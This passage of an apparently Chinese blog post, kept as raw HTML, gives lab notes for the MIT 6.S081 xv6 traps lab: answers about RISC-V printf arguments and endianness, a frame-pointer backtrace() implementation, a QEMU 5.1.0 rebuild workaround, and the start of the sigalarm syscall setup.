class="hljs-number">00646</span>c<span class="hljs-number">72</span>;<br><span class="hljs-attribute">printf</span>(<span class="hljs-string">&quot;H%x Wo%s&quot;</span>, <span class="hljs-number">57616</span>, &amp;i);<br>    <br></code></pre></td></tr></table></figure><p>What is the output? <a href="http://web.cs.mun.ca/~michael/c/ascii-table.html">Here’s an ASCII table</a> that maps bytes to characters.</p><p>The output depends on that fact that the RISC-V is little-endian. If the RISC-V were instead big-endian what would you set <code>i</code> to in order to yield the same output? Would you need to change <code>57616</code> to a different value?</p><p><a href="http://www.webopedia.com/TERM/b/big_endian.html">Here’s a description of little- and big-endian</a> and <a href="http://www.networksorcery.com/enp/ien/ien137.txt">a more whimsical description</a>.</p><p>57616是0xE110</p><p>%s打印出&amp;i指向十六进制数对应的ASCII码，遇0停止打印。变量<code>i</code>存储了字符串”rld\0”</p><p>最终打印出HE110 World</p><h2 id="Q5"><a href="#Q5" class="headerlink" title="Q5"></a>Q5</h2><p>In the following code, what is going to be printed after <code>&#39;y=&#39;</code>? (note: the answer is not a specific value.) Why does this happen?</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">printf</span>(<span class="hljs-string">&quot;x=%d y=%d&quot;</span>, <span class="hljs-number">3</span>);<br></code></pre></td></tr></table></figure><p>y=a2寄存器的值</p><p>这里printf函数相当于有三个参数，第一个是字符串（a0保存），第二个是3（a1保存），第三个（（a2保存））</p><h1 id="Backtrace-moderate"><a href="#Backtrace-moderate" class="headerlink" title="Backtrace (moderate)"></a>Backtrace (<a href="https://pdos.csail.mit.edu/6.S081/2020/labs/guidance.html">moderate</a>)</h1><p>要求：<strong>在 kernel/printf.c 中实现一个 backtrace ()函数。在 sys _ sleep 中插入对此函数的调用，然后运行 bttest，它调用 sys _ sleep。你的输出应该如下:</strong></p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-symbol">backtrace:</span><br><span class="hljs-number">0x000000080002cda</span><br><span class="hljs-number">0x000000080002bb6</span><br><span class="hljs-number">0x0000000080002898</span><br></code></pre></td></tr></table></figure><p>编译器在每个堆栈帧中放入一个包含调用者帧指针地址的帧指针。您的回溯应该使用这些帧指针来遍历堆栈，并在每个堆栈帧中打印保存的返回地址。</p><blockquote><p>补充一下基础知识：</p><p>栈指针：sp（stack pointer），指向栈的低地址</p><p>帧指针：fp（frame pointer），指向栈的高地址</p><p>fp-8：返回地址</p><p>fp-16：preview fp</p><p>内核会为栈分配一页的内存，因此可以使用 PGROUNDUP（fp）和 PGROUNDDOWN（fp）定位栈的上下边界，以终止循环</p></blockquote><p>具体的栈的内存布局参考lecture中教授手画图</p><ul><li><p>将backtrace的原型添加到 kernel/defs.h，这样就可以在 sys _ sleep 中调用backtrace</p><ul><li>在defs.h中添加<code>void backtrace(void);</code></li></ul></li><li><p>GCC 编译器将当前正在执行的函数的帧指针存储在寄存器 s0中。向 kernel/riscv.h 添加以下函数，并在backtrace中调用这个函数来读取当前帧指针。这个函数使用内联来读取 s0：</p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs asm">static inline uint64<br>r_fp()<br>&#123;<br>  uint64 x;<br>  asm volatile(&quot;mv %0, s0&quot; : &quot;=r&quot; (x) );<br>  return x;<br>&#125;<br></code></pre></td></tr></table></figure><p>在printf.c文件中添加函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">backtrace</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>  uint64 fp=r_fp();<span class="hljs-comment">//get fp </span><br>  uint64 up_addr=PGROUNDUP(fp);<span class="hljs-comment">//up bound</span><br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;backtrace:\n&quot;</span>);<span class="hljs-comment">//fmt output </span><br>  <span class="hljs-keyword">while</span>(fp&lt;up_addr)<br>  &#123;<br>    uint64 ret_addr=*(uint64 *)(fp<span class="hljs-number">-8</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%p\n&quot;</span>,ret_addr);<span class="hljs-comment">// attention that after %p is \n</span><br>    fp=*(uint64 *)(fp<span class="hljs-number">-16</span>);<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>bttest.c中如是写：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;kernel/types.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;kernel/stat.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;user/user.h&quot;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">int</span></span><br><span class="hljs-function"><span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span> *argv[])</span></span><br><span class="hljs-function"></span>&#123;<br>  sleep(<span class="hljs-number">1</span>);<br>  <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br><br></code></pre></td></tr></table></figure><p>因此bttest作为测试文件会调用sleep，也即是sys_sleep。我们在sys_sleep中加入如下代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function">uint64</span><br><span class="hljs-function"><span class="hljs-title">sys_sleep</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">int</span> n;<br>  uint ticks0;<br>  <span class="hljs-keyword">if</span>(argint(<span class="hljs-number">0</span>, &amp;n) &lt; <span class="hljs-number">0</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>  acquire(&amp;tickslock);<br>  ticks0 = ticks;<br>  <span class="hljs-keyword">while</span>(ticks - ticks0 &lt; n)&#123;<br>    <span class="hljs-keyword">if</span>(myproc()-&gt;killed)&#123;<br>      release(&amp;tickslock);<br>      <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br>    sleep(&amp;ticks, &amp;tickslock);<br>  &#125;<br>  release(&amp;tickslock);<br>  backtrace();<span class="hljs-comment">// </span><br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>这样的话，sleep返回之前会调用backtrace函数</p><p>类似的，为了更好的debug，在panic函数中加入如下代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span></span><br><span class="hljs-function"><span class="hljs-title">panic</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *s)</span></span><br><span class="hljs-function"></span>&#123;<br>  pr.locking = <span class="hljs-number">0</span>;<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;panic: &quot;</span>);<br>  <span class="hljs-built_in">printf</span>(s);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br>  backtrace();<br>  panicked = <span class="hljs-number">1</span>; <span class="hljs-comment">// freeze uart output from other CPUs</span><br>  <span class="hljs-keyword">for</span>(;;)<br>    ;<br>&#125;<br></code></pre></td></tr></table></figure><p>这样会在panic输出之后，打印出返回地址</p><blockquote><p>ps ：做到此处发现了的qemu卡死的问题，发现是2020版本lab的传统艺能。apt remove qemu*之后使用源码编译qemu5版本即可</p><p>Next, retrieve and extract the source for QEMU 5.1.0:</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-variable">$ </span>wget <span class="hljs-symbol">https:</span>/<span class="hljs-regexp">/download.qemu.org/qemu</span><span class="hljs-number">-5.1</span>.0.tar.xz<br><span class="hljs-variable">$ </span>tar xf qemu<span class="hljs-number">-5.1</span>.0.tar.xz<br></code></pre></td></tr></table></figure><p>Build QEMU for riscv64-softmmu:</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">$ <span class="hljs-keyword">cd</span> qemu-5.1.0<br>$ <span class="hljs-string">./configure</span> <span class="hljs-params">--disable-kvm</span> <span class="hljs-params">--disable-werror</span> <span class="hljs-params">--prefix=/usr/local</span> <span class="hljs-params">--target-list=</span><span class="hljs-string">&quot;riscv64-softmmu&quot;</span><br>$ make<br>$ sudo make install<br>$ <span class="hljs-keyword">cd</span> <span class="hljs-string">..</span><br></code></pre></td></tr></table></figure></blockquote><h1 id="Alarm-hard"><a href="#Alarm-hard" class="headerlink" title="Alarm (hard)"></a>Alarm (<a href="https://pdos.csail.mit.edu/6.S081/2020/labs/guidance.html">hard</a>)</h1><p>目标：</p><p>向 xv6添加一个特性，它将在进程使用 CPU 时间时<strong>周期性</strong>发出警报。更一般地说，实现用户级中断/错误处理程序的基本形式; 例如，可以使用类似的东西来处理应用程序中的页面错误。</p><p>hint：</p><ul><li>添加一个新的系统调用sigalarm(interval, handler)，如果应用程序调用 sigAlarm (n，fn) ，那么在程序消耗的每 n 个 CPU 时间之后，内核应该调用应用程序函数 fn。当 fn 返回时，应用程序应该从停止的地方恢复</li><li>如果一个应用程序调用 sigAlarm (0,0) ，内核应该停止生成周期性的alarm调用</li><li>user/alarmtest.c是测试文件，需要将其添加到makefile。添加了 sigAlarm 和 sigreturn 系统调用，它才能正确编译</li><li>可以在 user/alarmtest.asm 中看到 alarmtest 的汇编代码，这可能有助于调试</li><li>alarmtest 中在 test0 调用了 sigalarm(2, periodic)，要求内核强制每隔2个tick调用 period () ，然后spin一段时间</li></ul><p>test0：修改内核以跳转到用户空间中的警报处理程序</p><p>先修改makefile编译出alarmtest</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c">UPROGS=\<br>$U/_cat\<br>$U/_echo\<br>$U/_forktest\<br>$U/_grep\<br>$U/_init\<br>$U/_kill\<br>$U/_ln\<br>$U/_ls\<br>$U/_mkdir\<br>$U/_rm\<br>$U/_sh\<br>$U/_stressfs\<br>$U/_usertests\<br>$U/_grind\<br>$U/_wc\<br>$U/_zombie\<br>$U/_alarmtest\<br></code></pre></td></tr></table></figure><p>放入 user/user.h 中的正确声明:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// system calls</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">sigalarm</span><span class="hljs-params">(<span class="hljs-keyword">int</span> ticks, <span class="hljs-keyword">void</span> (*handler)())</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">sigreturn</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">fork</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">exit</span><span class="hljs-params">(<span class="hljs-keyword">int</span>)</span> __<span class="hljs-title">attribute__</span><span class="hljs-params">((noreturn))</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">wait</span><span class="hljs-params">(<span class="hljs-keyword">int</span>*)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">pipe</span><span class="hljs-params">(<span class="hljs-keyword">int</span>*)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">write</span><span class="hljs-params">(<span class="hljs-keyword">int</span>, <span class="hljs-keyword">const</span> <span class="hljs-keyword">void</span>*, <span class="hljs-keyword">int</span>)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">read</span><span class="hljs-params">(<span class="hljs-keyword">int</span>, <span class="hljs-keyword">void</span>*, <span class="hljs-keyword">int</span>)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">close</span><span class="hljs-params">(<span class="hljs-keyword">int</span>)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">kill</span><span class="hljs-params">(<span class="hljs-keyword">int</span>)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">exec</span><span class="hljs-params">(<span class="hljs-keyword">char</span>*, <span class="hljs-keyword">char</span>**)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">open</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span>*, <span class="hljs-keyword">int</span>)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">mknod</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span>*, <span class="hljs-keyword">short</span>, <span class="hljs-keyword">short</span>)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">unlink</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span>*)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">fstat</span><span class="hljs-params">(<span class="hljs-keyword">int</span> fd, struct stat*)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">link</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span>*, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span>*)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">mkdir</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span>*)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">chdir</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span>*)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">dup</span><span class="hljs-params">(<span class="hljs-keyword">int</span>)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">getpid</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">char</span>* <span class="hljs-title">sbrk</span><span class="hljs-params">(<span class="hljs-keyword">int</span>)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">sleep</span><span class="hljs-params">(<span class="hljs-keyword">int</span>)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">uptime</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span>;<br><br><span class="hljs-comment">// ulib.c</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">stat</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span>*, struct stat*)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">char</span>* <span class="hljs-title">strcpy</span><span class="hljs-params">(<span class="hljs-keyword">char</span>*, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span>*)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">void</span> *<span class="hljs-title">memmove</span><span class="hljs-params">(<span class="hljs-keyword">void</span>*, <span class="hljs-keyword">const</span> <span class="hljs-keyword">void</span>*, <span class="hljs-keyword">int</span>)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">char</span>* <span class="hljs-title">strchr</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span>*, <span class="hljs-keyword">char</span> c)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">strcmp</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span>*, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span>*)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">fprintf</span><span class="hljs-params">(<span class="hljs-keyword">int</span>, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span>*, ...)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">printf</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span>*, ...)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">char</span>* <span class="hljs-title">gets</span><span class="hljs-params">(<span class="hljs-keyword">char</span>*, <span class="hljs-keyword">int</span> max)</span></span>;<br><span class="hljs-function">uint <span class="hljs-title">strlen</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span>*)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">void</span>* <span class="hljs-title">memset</span><span class="hljs-params">(<span class="hljs-keyword">void</span>*, <span class="hljs-keyword">int</span>, uint)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">void</span>* <span class="hljs-title">malloc</span><span class="hljs-params">(uint)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">free</span><span class="hljs-params">(<span class="hljs-keyword">void</span>*)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">atoi</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span>*)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">memcmp</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">void</span> *, <span class="hljs-keyword">const</span> <span class="hljs-keyword">void</span> *, uint)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">void</span> *<span class="hljs-title">memcpy</span><span class="hljs-params">(<span class="hljs-keyword">void</span> *, <span class="hljs-keyword">const</span> <span class="hljs-keyword">void</span> *, uint)</span></span>;<br></code></pre></td></tr></table></figure><p>更新 user/usys.pl (生成 user/usys.S)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs c">#!/usr/bin/perl -w<br><br># Generate usys.S, the stubs <span class="hljs-keyword">for</span> syscalls.<br><br>print <span class="hljs-string">&quot;# generated by usys.pl - do not edit\n&quot;</span>;<br><br>print <span class="hljs-string">&quot;#include \&quot;kernel/syscall.h\&quot;\n&quot;</span>;<br><br>sub entry &#123;<br>    my $name = shift;<br>    print <span class="hljs-string">&quot;.global $name\n&quot;</span>;<br>    print <span class="hljs-string">&quot;$&#123;name&#125;:\n&quot;</span>;<br>    print <span class="hljs-string">&quot; li a7, SYS_$&#123;name&#125;\n&quot;</span>;<br>    print <span class="hljs-string">&quot; ecall\n&quot;</span>;<br>    print <span class="hljs-string">&quot; ret\n&quot;</span>;<br>&#125;<br><br>entry(<span class="hljs-string">&quot;fork&quot;</span>);<br>entry(<span class="hljs-string">&quot;exit&quot;</span>);<br>entry(<span class="hljs-string">&quot;wait&quot;</span>);<br>entry(<span class="hljs-string">&quot;pipe&quot;</span>);<br>entry(<span class="hljs-string">&quot;read&quot;</span>);<br>entry(<span class="hljs-string">&quot;write&quot;</span>);<br>entry(<span class="hljs-string">&quot;close&quot;</span>);<br>entry(<span class="hljs-string">&quot;kill&quot;</span>);<br>entry(<span class="hljs-string">&quot;exec&quot;</span>);<br>entry(<span class="hljs-string">&quot;open&quot;</span>);<br>entry(<span class="hljs-string">&quot;mknod&quot;</span>);<br>entry(<span class="hljs-string">&quot;unlink&quot;</span>);<br>entry(<span class="hljs-string">&quot;fstat&quot;</span>);<br>entry(<span class="hljs-string">&quot;link&quot;</span>);<br>entry(<span class="hljs-string">&quot;mkdir&quot;</span>);<br>entry(<span class="hljs-string">&quot;chdir&quot;</span>);<br>entry(<span class="hljs-string">&quot;dup&quot;</span>);<br>entry(<span class="hljs-string">&quot;getpid&quot;</span>);<br>entry(<span class="hljs-string">&quot;sbrk&quot;</span>);<br>entry(<span class="hljs-string">&quot;sleep&quot;</span>);<br>entry(<span class="hljs-string">&quot;uptime&quot;</span>);<br>entry(<span class="hljs-string">&quot;sigalarm&quot;</span>);<span class="hljs-comment">//</span><br>entry(<span class="hljs-string">&quot;sigreturn&quot;</span>);<span class="hljs-comment">//</span><br></code></pre></td></tr></table></figure><p> kernel/syscall.h </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// System call numbers</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SYS_fork    1</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SYS_exit    2</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SYS_wait    3</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SYS_pipe    4</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SYS_read    5</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SYS_kill    6</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SYS_exec    7</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SYS_fstat   8</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SYS_chdir   9</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SYS_dup    10</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SYS_getpid 11</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SYS_sbrk   12</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SYS_sleep  13</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SYS_uptime 14</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SYS_open   15</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SYS_write  16</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SYS_mknod  17</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SYS_unlink 18</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SYS_link   19</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SYS_mkdir  20</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SYS_close  21</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SYS_sigalarm 22</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SYS_sigreturn 23</span><br></code></pre></td></tr></table></figure><p>kernel/syscall.c</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs c"><br><span class="hljs-function"><span class="hljs-keyword">extern</span> uint64 <span class="hljs-title">sys_chdir</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">extern</span> uint64 <span class="hljs-title">sys_close</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">extern</span> uint64 <span class="hljs-title">sys_dup</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">extern</span> uint64 <span class="hljs-title">sys_exec</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">extern</span> uint64 <span class="hljs-title">sys_exit</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">extern</span> uint64 <span class="hljs-title">sys_fork</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">extern</span> uint64 <span class="hljs-title">sys_fstat</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">extern</span> uint64 <span class="hljs-title">sys_getpid</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">extern</span> uint64 <span class="hljs-title">sys_kill</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">extern</span> uint64 <span class="hljs-title">sys_link</span><span 